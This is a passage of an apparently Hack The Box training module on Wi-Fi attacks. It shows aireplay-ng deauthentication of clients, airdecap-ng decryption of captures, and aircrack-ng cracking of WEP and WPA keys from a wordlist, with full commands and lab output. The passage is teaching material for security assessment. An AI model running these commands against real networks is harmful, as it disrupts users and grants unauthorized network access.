+<h4 id="using-aireplay-ng-to-perform-deauthentication">Using Aireplay-ng to perform Deauthentication</h4>
+<p>First, let's use airodump-ng to view the available WiFi networks, also known as access points (APs).</p>
+<p>  Aireplay-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng wlan0mon
+
+CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 1 </span>min ][ 2007-04-26 17:41 ][
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span>
+
+ 00:09:5B:1C:AA:1D  <span class="hljs-number"> 11 </span><span class="hljs-number"> 16 </span>     <span class="hljs-number"> 10 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> 54.  OPN              TOMMY                         
+ 00:14:6C:7A:41:81  <span class="hljs-number"> 34 </span>100      <span class="hljs-number"> 57 </span>     <span class="hljs-number"> 14 </span>  <span class="hljs-number"> 1 </span> <span class="hljs-number"> 1 </span> 11e  WPA  TKIP   PSK  HTB 
+ 00:14:6C:7E:40:80  <span class="hljs-number"> 32 </span>100     <span class="hljs-number"> 752 </span>     <span class="hljs-number"> 73 </span>  <span class="hljs-number"> 2 </span> <span class="hljs-number"> 1 </span><span class="hljs-number"> 54 </span>  WPA  TKIP   PSK  jhony                             
+
+ BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes
+
+ 00:14:6C:7A:41:81  00:0F:B5:32:31:31  <span class="hljs-number"> 51 </span>  36-24   <span class="hljs-number"> 2 </span>     <span class="hljs-number"> 14 </span>          HTB 
+ (not associated)   00:14:A4:3F:8D:13  <span class="hljs-number"> 19 </span>   0-0    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 4 </span>           
+ 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36   <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 5 </span>          HTB 
+ 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2  <span class="hljs-number"> 35 </span>  54-54   <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 99 </span>          jhony
+</code></pre>
+<p>From the above output, we can see that there are three available WiFi networks, and <code>two clients</code> are connected to the network named <code>HTB</code>. Let's send a deauthentication request to one of the clients with the station ID <code>00:0F:B5:32:31:31</code>.</p>
+<p>  Aireplay-ng</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo aireplay-ng <span class="hljs-number">-0</span> <span class="hljs-number">5</span> -a <span class="hljs-number">00</span>:<span class="hljs-number">14</span>:<span class="hljs-number">6</span><span class="hljs-string">C:</span><span class="hljs-number">7</span><span class="hljs-string">A:</span><span class="hljs-number">41</span>:<span class="hljs-number">81</span> -c <span class="hljs-number">00</span>:<span class="hljs-number">0</span><span class="hljs-string">F:</span><span class="hljs-string">B5:</span><span class="hljs-number">32</span>:<span class="hljs-number">31</span>:<span class="hljs-number">31</span> wlan0mon
+<span class="hljs-symbol">
+11:</span><span class="hljs-number">12</span>:<span class="hljs-number">33</span>  Waiting <span class="hljs-keyword">for</span> beacon frame (<span class="hljs-string">BSSID:</span> <span class="hljs-number">00</span>:<span class="hljs-number">14</span>:<span class="hljs-number">6</span><span class="hljs-string">C:</span><span class="hljs-number">7</span><span class="hljs-string">A:</span><span class="hljs-number">41</span>:<span class="hljs-number">81</span>) on channel <span class="hljs-number">1</span>
+<span class="hljs-number">11</span>:<span class="hljs-number">12</span>:<span class="hljs-number">34</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">00</span>:<span class="hljs-number">0</span><span class="hljs-string">F:</span><span class="hljs-string">B5:</span><span class="hljs-number">32</span>:<span class="hljs-number">31</span>:<span class="hljs-number">3</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">11</span>:<span class="hljs-number">12</span>:<span class="hljs-number">34</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">00</span>:<span class="hljs-number">0</span><span class="hljs-string">F:</span><span class="hljs-string">B5:</span><span class="hljs-number">32</span>:<span class="hljs-number">31</span>:<span class="hljs-number">3</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">11</span>:<span class="hljs-number">12</span>:<span class="hljs-number">35</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">00</span>:<span class="hljs-number">0</span><span class="hljs-string">F:</span><span class="hljs-string">B5:</span><span class="hljs-number">32</span>:<span class="hljs-number">31</span>:<span class="hljs-number">3</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">11</span>:<span class="hljs-number">12</span>:<span class="hljs-number">35</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">00</span>:<span class="hljs-number">0</span><span class="hljs-string">F:</span><span class="hljs-string">B5:</span><span class="hljs-number">32</span>:<span class="hljs-number">31</span>:<span class="hljs-number">3</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">11</span>:<span class="hljs-number">12</span>:<span class="hljs-number">36</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">00</span>:<span class="hljs-number">0</span><span class="hljs-string">F:</span><span class="hljs-string">B5:</span><span class="hljs-number">32</span>:<span class="hljs-number">31</span>:<span class="hljs-number">3</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+</code></pre>
+<ul>
+<li><code>-0</code> means deauthentication</li>
+<li><code>5</code> is the number of deauths to send (you can send multiple if you wish); <code>0</code> means send them continuously</li>
+<li><code>-a 00:14:6C:7A:41:81</code> is the MAC address of the access point</li>
+<li><code>-c 00:0F:B5:32:31:31</code> is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated</li>
+<li><code>wlan0mon</code> is the interface name</li>
+</ul>
+<p>Once the clients are deauthenticated from the AP, we can continue observing <code>airodump-ng</code> to see when they reconnect.</p>
+<p>  Aireplay-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng wlan0mon
+
+CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 1 </span>min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7A:41:81
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span>
+
+ 00:09:5B:1C:AA:1D  <span class="hljs-number"> 11 </span><span class="hljs-number"> 16 </span>     <span class="hljs-number"> 10 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> 54.  OPN              TOMMY                         
+ 00:14:6C:7A:41:81  <span class="hljs-number"> 34 </span>100      <span class="hljs-number"> 57 </span>     <span class="hljs-number"> 14 </span>  <span class="hljs-number"> 1 </span> <span class="hljs-number"> 1 </span> 11e  WPA  TKIP   PSK  HTB 
+ 00:14:6C:7E:40:80  <span class="hljs-number"> 32 </span>100     <span class="hljs-number"> 752 </span>     <span class="hljs-number"> 73 </span>  <span class="hljs-number"> 2 </span> <span class="hljs-number"> 1 </span><span class="hljs-number"> 54 </span>  WPA  TKIP   PSK  jhony                             
+
+ BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes
+
+ 00:14:6C:7A:41:81  00:0F:B5:32:31:31  <span class="hljs-number"> 51 </span>  36-24  <span class="hljs-number"> 212 </span>   <span class="hljs-number"> 145 </span>  EAPOL  HTB 
+ (not associated)   00:14:A4:3F:8D:13  <span class="hljs-number"> 19 </span>   0-0     <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 4 </span>           
+ 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 5 </span>         HTB 
+ 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2  <span class="hljs-number"> 35 </span>  54-54    <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 9 </span>         jhony
+</code></pre>
+<p>In the output above, we can see that after sending the deauthentication packet, the client disconnects and then reconnects. This is evidenced by the increase in <code>Lost</code> packets and <code>Frames</code> count.</p>
+<p>Additionally, a <code>four-way handshake</code> would be captured by <code>airodump-ng</code>, as shown in the output. By using the <code>-w</code> option in airodump-ng, we can save the captured WPA handshake into a <code>.pcap</code> file. This file can then be used with tools like <code>aircrack-ng</code> to crack the pre-shared key (PSK). We will cover aircrack-ng and the process of cracking PSKs in the upcoming aircrack-ng section.</p>
+<p>In the lab environment, the clients continuously reconnect to the AP every few seconds. Therefore, it is possible to capture the <code>WPA handshake</code> without sending deauthentication requests.</p>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In the next section, we will take an in-depth look at the <code>airdecap-ng</code> tool. Airdecap-ng is a powerful utility used to decrypt captured packet files that are encrypted with WEP, WPA, or WPA2 protocols. By utilizing this tool, we can effectively decode encrypted network traffic and gain access to the data contained within, which is crucial for performing security assessments and analyzing network vulnerabilities.</p>
+<p>We will explore how to use airdecap-ng to decrypt captured packets, discuss the various options available for decryption, and examine practical scenarios where decrypting network traffic can be beneficial for network security analysis.</p>
+<hr>
+<h2 id="airdecap-ng">Airdecap-ng</h2>
+<hr>
+<p><a href="https://www.aircrack-ng.org/doku.php?id=airdecap-ng">Airdecap-ng</a> is a valuable tool for decrypting wireless capture files once we have obtained the <code>key</code> to a network. It can decrypt <code>WEP</code>, <code>WPA PSK</code>, and <code>WPA2 PSK</code> captures. Additionally, it can remove wireless headers from an <code>unencrypted</code> capture file. This tool is particularly useful in analyzing the data within captured packets by making the content readable and removing unnecessary wireless protocol information.</p>
+<p>Airdecap-ng can be used for the following:</p>
+<ul>
+<li>Removing wireless headers from an open network capture (Unencrypted capture).</li>
+<li>Decrypting a WEP-encrypted capture file using a hexadecimal WEP key.</li>
+<li>Decrypting a WPA/WPA2-encrypted capture file using the passphrase.</li>
+</ul>
+<hr>
+<h4 id="using-airdecap-ng">Using Airdecap-ng</h4>
+<p>Code: usage</p>
+<pre><code class="lang-usage">airdecap-ng [<span class="hljs-keyword">options</span>] &lt;pcap <span class="hljs-keyword">file</span>&gt;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th><strong>Option</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-l</code></td>
+<td>don't remove the 802.11 header</td>
+</tr>
+<tr>
+<td><code>-b</code></td>
+<td>access point MAC address filter</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>WPA/WPA2 Pairwise Master Key in hex</td>
+</tr>
+<tr>
+<td><code>-e</code></td>
+<td>target network ascii identifier</td>
+</tr>
+<tr>
+<td><code>-p</code></td>
+<td>target network WPA/WPA2 passphrase</td>
+</tr>
+<tr>
+<td><code>-w</code></td>
+<td>target network WEP key in hexadecimal</td>
+</tr>
+</tbody>
+</table>
+<p><code>Airdecap-ng</code> generates a new file with the suffix <code>-dec.cap,</code> which contains the decrypted or stripped version of the original input file. For instance, an input file named <code>HTB-01.cap</code> will result in an unencrypted output file named <code>HTB-01-dec.cap</code>.</p>
+<p>In the encrypted capture file created using <code>airodump-ng</code> and opened using Wireshark as shown below, the <code>Protocol</code> tab only displays <code>802.11</code> without specifying the actual protocol of the message. Similarly, the <code>Info</code> tab does not provide meaningful information. Additionally, the <code>source</code> and <code>destination</code> fields only contain MAC addresses instead of the corresponding IP addresses.</p>
+<p><img src="storage\modules\222\airdecap-ng\Wireshark_1.JPG" alt="Wireshark capture showing 802.11 frames including Beacon, Probe Requests, Data, and Deauthentication between various sources and destinations, with SSID 'Wildcard'."></p>
+<p>Conversely, in the decrypted capture file using <code>airdecap-ng</code>, observe how the <code>Protocol</code> tab displays the correct protocol, such as ARP, TCP, DHCP, HTTP, etc. Additionally, notice how the <code>Info</code> tab provides more detailed information, and it correctly displays the <code>source</code> and <code>destination</code> IP addresses.</p>
+<p><img src="storage\modules\222\airdecap-ng\Wireshark_2.JPG" alt="Wireshark capture showing various network protocols including ICMPv6, DHCP, SSDP, MDNS, ARP, and TCP, with multiple source and destination IPs, displaying different network activities."></p>
+<hr>
+<h4 id="removing-wireless-headers-from-unencrypted-capture-file">Removing Wireless Headers from Unencrypted Capture file</h4>
+<p>Capturing packets on an open network would result in an <code>unencrypted</code> capture file. Even if the capture file is already unencrypted, it may still contain numerous frames that are not relevant to our analysis. To streamline the data, we can utilize <code>airdecap-ng</code> to eliminate the wireless headers from an unencrypted capture file.</p>
+<p>To remove the wireless headers from the capture file using Airdecap-ng, we can use the following command:</p>
+<p>Code: usage</p>
+<pre><code class="lang-usage"><span class="hljs-symbol">airdecap</span>-ng -<span class="hljs-keyword">b </span>&lt;<span class="hljs-keyword">bssid&gt; </span>&lt;capture-file&gt;
+</code></pre>
+<p>Replace with the MAC address of the access point and with the name of the capture file.</p>
+<p>  Airdecap-ng</p>
+<pre><code class="lang-shell-session"><span class="hljs-type">root</span>@htb[/htb]$ sudo airdecap-ng -b <span class="hljs-number">00</span>:<span class="hljs-number">14</span>:<span class="hljs-number">6</span>C:<span class="hljs-number">7</span>A:<span class="hljs-number">41</span>:<span class="hljs-number">81</span> opencapture.cap
+
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> stations seen            <span class="hljs-number">0</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> packets read           <span class="hljs-number">251</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> <span class="hljs-type">WEP</span> <span class="hljs-class"><span class="hljs-keyword">data</span> packets         0</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> <span class="hljs-type">WPA</span> <span class="hljs-class"><span class="hljs-keyword">data</span> packets         0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> plaintext <span class="hljs-class"><span class="hljs-keyword">data</span> packets         0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> decrypted <span class="hljs-type">WEP</span>  packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> corrupted <span class="hljs-type">WEP</span>  packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> decrypted <span class="hljs-type">WPA</span>  packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> bad <span class="hljs-type">TKIP</span> (<span class="hljs-type">WPA</span>) packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> bad <span class="hljs-type">CCMP</span> (<span class="hljs-type">WPA</span>) packets         <span class="hljs-number">0</span>
+</code></pre>
+<p>This will produce a decrypted file with the suffix <code>-dec.cap</code>, such as <code>opencapture-dec.cap</code>, containing the streamlined data ready for further analysis.</p>
+<hr>
+<h4 id="decrypting-wep-encrypted-captures">Decrypting WEP-encrypted captures</h4>
+<p>Airdecap-ng is a powerful tool for decrypting WEP-encrypted capture files. Once we have obtained the hexadecimal <code>WEP key</code>, we can use it to decrypt the captured packets. This process will remove the wireless encryption, allowing us to analyze the data.</p>
+<p>To decrypt a WEP-encrypted capture file using Airdecap-ng, we can use the following command:</p>
+<p>Code: usage</p>
+<pre><code class="lang-usage">airdecap-ng -w <span class="hljs-tag">&lt;<span class="hljs-name">WEP-key</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">capture-file</span>&gt;</span>
+</code></pre>
+<p>Replace \<wep-key> with the hexadecimal WEP key and with the name of the capture file.</wep-key></p>
+<p>For example:</p>
+<p>  Airdecap-ng</p>
+<pre><code class="lang-shell-session"><span class="hljs-type">root</span>@htb[/htb]$ sudo airdecap-ng -w <span class="hljs-number">1234567890</span>ABCDEF <span class="hljs-type">HTB</span><span class="hljs-number">-01.</span>cap
+
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> stations seen            <span class="hljs-number">6</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> packets read           <span class="hljs-number">356</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> <span class="hljs-type">WEP</span> <span class="hljs-class"><span class="hljs-keyword">data</span> packets       235</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> <span class="hljs-type">WPA</span> <span class="hljs-class"><span class="hljs-keyword">data</span> packets       121</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> plaintext <span class="hljs-class"><span class="hljs-keyword">data</span> packets         0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> decrypted <span class="hljs-type">WEP</span>  packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> corrupted <span class="hljs-type">WEP</span>  packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> decrypted <span class="hljs-type">WPA</span>  packets       <span class="hljs-number">235</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> bad <span class="hljs-type">TKIP</span> (<span class="hljs-type">WPA</span>) packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> bad <span class="hljs-type">CCMP</span> (<span class="hljs-type">WPA</span>) packets         <span class="hljs-number">0</span>
+</code></pre>
+<p>This will produce a decrypted file with the suffix <code>-dec.cap</code>, such as <code>HTB-01-dec.cap</code>, containing the unencrypted data ready for further analysis.</p>
+<h4 id="decrypting-wpa-encrypted-captures">Decrypting WPA-encrypted captures</h4>
+<p>Airdecap-ng can also decrypt WPA-encrypted capture files, provided we have the <code>passphrase</code>. This tool will strip the WPA encryption, making it possible to analyze the captured data.</p>
+<p>To decrypt a WPA-encrypted capture file using Airdecap-ng, we can use the following command:</p>
+<p>Code: usage</p>
+<pre><code class="lang-usage">airdecap-ng -p <span class="hljs-tag">&lt;<span class="hljs-name">passphrase</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">capture-file</span>&gt;</span> -e <span class="hljs-tag">&lt;<span class="hljs-name">essid</span>&gt;</span>
+</code></pre>
+<p>Replace with the WPA passphrase, with the name of the capture file and with the ESSID name of the respective network.</p>
+<p>For example:</p>
+<p>  Airdecap-ng</p>
+<pre><code class="lang-shell-session"><span class="hljs-type">root</span>@htb[/htb]$ sudo airdecap-ng -p 'abdefg' <span class="hljs-type">HTB</span><span class="hljs-number">-01.</span>cap -e <span class="hljs-string">"Wireless Lab"</span>
+
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> stations seen            <span class="hljs-number">6</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> packets read           <span class="hljs-number">356</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> <span class="hljs-type">WEP</span> <span class="hljs-class"><span class="hljs-keyword">data</span> packets       235</span>
+<span class="hljs-type">Total</span> number <span class="hljs-keyword">of</span> <span class="hljs-type">WPA</span> <span class="hljs-class"><span class="hljs-keyword">data</span> packets       121</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> plaintext <span class="hljs-class"><span class="hljs-keyword">data</span> packets         0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> decrypted <span class="hljs-type">WEP</span>  packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> corrupted <span class="hljs-type">WEP</span>  packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> decrypted <span class="hljs-type">WPA</span>  packets       <span class="hljs-number">121</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> bad <span class="hljs-type">TKIP</span> (<span class="hljs-type">WPA</span>) packets         <span class="hljs-number">0</span>
+<span class="hljs-type">Number</span> <span class="hljs-keyword">of</span> bad <span class="hljs-type">CCMP</span> (<span class="hljs-type">WPA</span>) packets         <span class="hljs-number">0</span>
+</code></pre>
+<p>This will produce a decrypted file with the suffix <code>-dec.cap</code>, such as <code>HTB-01-dec.cap</code>, containing the unencrypted data ready for further analysis.</p>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In this section, we explored how to decrypt captured packet files to obtain essential data from network traffic. We examined the process of using tools to remove encryption from packets and access valuable information for security analysis.</p>
+<p>In the next section, we will delve into aircrack-ng, a powerful program designed for cracking 802.11 WEP and WPA/WPA2-PSK keys. Aircrack-ng is a crucial tool for network security professionals, used to perform brute-force attacks to recover encryption keys and assess the strength of wireless network security measures.</p>
+<hr>
+<h2 id="aircrack-ng">Aircrack-ng</h2>
+<hr>
+<p>Aircrack-ng is a powerful tool designed for network security testing, capable of cracking WEP and WPA/WPA2 networks that use pre-shared keys or PMKID. Aircrack-ng is an offline attack tool, as it works with captured packets and doesn't need direct interaction with any Wi-Fi device.</p>
+<hr>
+<h4 id="aircrack-ng-benchmark">Aircrack-ng Benchmark</h4>
+<p>Prior to commencing passphrase cracking with Aircrack-ng, it is imperative to assess the benchmark of the host system to ensure its capability to execute brute-force attacks effectively. Aircrack-ng has a benchmark mode to test CPU performance. We'll start with benchmarking to evaluate the performance capabilities of our cracking system.</p>
+<p>  Aircrack-ng</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ aircrack-ng -S
+
+<span class="hljs-number">1628.101</span> k/s
+</code></pre>
+<p>The above output estimates that our CPU can crack approximately 1,628.101 passphrases per second. Since <code>Aircrack-ng</code> fully utilizes the CPU, the cracking speed can decrease significantly if other demanding tasks are running on the system simultaneously.</p>
+<hr>
+<h4 id="cracking-wep">Cracking WEP</h4>
+<p>Aircrack-ng is capable of recovering the WEP key once a sufficient number of encrypted packets have been captured using Airodump-ng. It is possible to save only the captured IVs (Initialization Vectors) using the <code>--ivs</code> option in Airodump-ng. Once enough IVs are captured, we can utilize the <code>-K</code> option in Aircrack-ng, which invokes the Korek WEP cracking method to crack the WEP key.</p>
+<p>  Aircrack-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aircrack-ng -K HTB.ivs 
+
+Reading packets, please wait...
+Opening HTB.ivs
+Read<span class="hljs-number"> 567298 </span>packets.
+
+   <span class="hljs-comment">#  BSSID              ESSID                     Encryption</span>
+
+  <span class="hljs-number"> 1 </span> D2:13:94:21:7F:1A                            WEP (0 IVs)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening HTB.ivs
+Read<span class="hljs-number"> 567298 </span>packets.
+
+1 potential targets
+
+                                             Aircrack-ng 1.6 
+
+
+                               [00:00:17] Tested<span class="hljs-number"> 1741 </span>keys (got<span class="hljs-number"> 566693 </span>IVs)
+
+   KB    depth   byte(vote)
+   <span class="hljs-number"> 0 </span>   0/ <span class="hljs-number"> 1 </span>  EB(  50) 11(  20) 71(  20) 0D(  12) 10(  12) 68(  12) 84(  12) 0A(   9) 
+   <span class="hljs-number"> 1 </span>   1/ <span class="hljs-number"> 2 </span>  C8(  31) BD(  18) F8(  17) E6(  16) 35(  15) 7A(  13) 7F(  13) 81(  13) 
+   <span class="hljs-number"> 2 </span>   0/ <span class="hljs-number"> 3 </span>  7F(  31) 74(  24) 54(  17) 1C(  13) 73(  13) 86(  12) 1B(  10) BF(  10) 
+   <span class="hljs-number"> 3 </span>   0/ <span class="hljs-number"> 1 </span>  3A( 148) EC(  20) EB(  16) FB(  13) 81(  12) D7(  12) ED(  12) F0(  12) 
+   <span class="hljs-number"> 4 </span>   0/ <span class="hljs-number"> 1 </span>  03( 140) 90(  31) 4A(  15) 8F(  14) E9(  13) AD(  12) 86(  10) DB(  10) 
+   <span class="hljs-number"> 5 </span>   0/ <span class="hljs-number"> 1 </span>  D0(  69) 04(  27) 60(  24) C8(  24) 26(  20) A1(  20) A0(  18) 4F(  17) 
+   <span class="hljs-number"> 6 </span>   0/ <span class="hljs-number"> 1 </span>  AF( 124) D4(  29) C8(  20) EE(  18) 3F(  12) 54(  12) 3C(  11) 90(  11) 
+   <span class="hljs-number"> 7 </span>   0/ <span class="hljs-number"> 1 </span>  DA( 168) 90(  24) 72(  22) F5(  21) 11(  20) F1(  20) 86(  17) FB(  16) 
+   <span class="hljs-number"> 8 </span>   0/ <span class="hljs-number"> 1 </span>  F6( 157) EE(  24) 66(  20) DA(  18) E0(  18) EA(  18) 82(  17) 11(  16) 
+   <span class="hljs-number"> 9 </span>   1/ <span class="hljs-number"> 2 </span>  7B(  44) E2(  30) 11(  27) DE(  23) A4(  20) 66(  19) E9(  18) 64(  17) 
+  <span class="hljs-number"> 10 </span>   1/ <span class="hljs-number"> 1 </span>  01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 06(   0) 07(   0) 08(   0) 
+
+             KEY FOUND! [ EB:C8:7F:3A:03:D0:AF:DA:F6:8D:A5:E2:C7 ] 
+    Decrypted correctly: 100%
+</code></pre>
+<hr>
+<h4 id="cracking-wpa">Cracking WPA</h4>
+<p>Aircrack-ng has the capability to crack the WPA key once a "four-way handshake" has been captured using Airodump-ng. To crack WPA/WPA2 pre-shared keys, only a dictionary-based method can be employed, which necessitates the use of a wordlist containing potential passwords. A "four-way handshake" serves as the required input. For WPA handshakes, a complete handshake comprises four packets. However, Aircrack-ng can effectively operate with just two packets. Specifically, EAPOL packets 2 and 3, or packets 3 and 4, are considered a full handshake.</p>
+<p>  Aircrack-ng</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aircrack-ng HTB.pcap -w /opt/wordlist.txt
+
+Reading packets, please wait...
+Opening HTB.pcap
+Read<span class="hljs-number"> 1093 </span>packets.
+
+   <span class="hljs-comment">#  BSSID              ESSID                     Encryption</span>
+
+  <span class="hljs-number"> 1 </span> 2D:0C:51:12:B2:33  HTB-Wireless              WPA (1 handshake, with PMKID)
+  <span class="hljs-number"> 2 </span> DA:28:A7:B7:30:84                            Unknown
+  <span class="hljs-number"> 3 </span> 53:68:F7:B7:51:B9                            Unknown
+  <span class="hljs-number"> 4 </span> 95:D1:46:23:5A:DD                            Unknown
+
+
+
+Index number of target network ? 1
+
+Reading packets, please wait...
+Opening HTB.pcap
+Read<span class="hljs-number"> 1093 </span>packets.
+
+1 potential targets
+
+                               Aircrack-ng 1.6 
+
+      [00:00:00] 802/14344392 keys tested (2345.32 k/s) 
+
+      Time left:<span class="hljs-number"> 1 </span>hour,<span class="hljs-number"> 41 </span>minutes,<span class="hljs-number"> 55 </span>seconds                  0.01%
+
+                           KEY FOUND! [ HTB@123 ]
+
+
+      Master Key     : A2<span class="hljs-number"> 88 </span>FC F0 CA AA CD A9 A9 F5<span class="hljs-number"> 86 </span>33 FF<span class="hljs-number"> 35 </span>E8<span class="hljs-number"> 99 </span>
+                       2A<span class="hljs-number"> 01 </span>D9 C1 0B A5 E0 2E FD F8 CB 5D<span class="hljs-number"> 73 </span>0C E7 BC 
+
+      Transient Key  :<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 
+                      <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 
+                      <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 
+                      <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 
+
+      EAPOL HMAC     : A4<span class="hljs-number"> 62 </span>A7<span class="hljs-number"> 02 </span>9A D5 BA<span class="hljs-number"> 30 </span>B6 AF 0D F3<span class="hljs-number"> 91 </span>98 8E 45
+</code></pre>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In the next section, we will examine how to connect to different types of Wi-Fi networks using both graphical and command-line interfaces, once we have recovered the network password.</p>
+<hr>
+<h2 id="connecting-to-wi-fi-networks">Connecting to Wi-Fi Networks</h2>
+<hr>
+<p>Connecting to Wi-Fi networks using Linux involves a few straightforward steps. First, we need to scan for available networks, which can be done using tools like <code>iwlist</code> or through a <code>graphical network manager</code>. Once we identify the target network, we can connect by configuring the appropriate settings. In this section, we will explore how to connect to Wi-Fi networks using both graphical and command-line interfaces.</p>
+<hr>
+<h3 id="using-gui">Using GUI</h3>
+<p>Connecting to a Wi-Fi network with a GUI is typically a straightforward process. Once we obtain the valid credentials (either a passphrase for WPA/WPA2-Personal, username/password for WPA/WPA2-Enterprise or key for WEP), we simply input them into the password prompt provided by the system's network manager.</p>
+<p>Here’s a breakdown of how this process usually works using GUI:</p>
+<ol>
+<li><code>Scan for Networks</code></li>
+<li><code>Select the Network</code></li>
+<li><code>Enter Credentials</code></li>
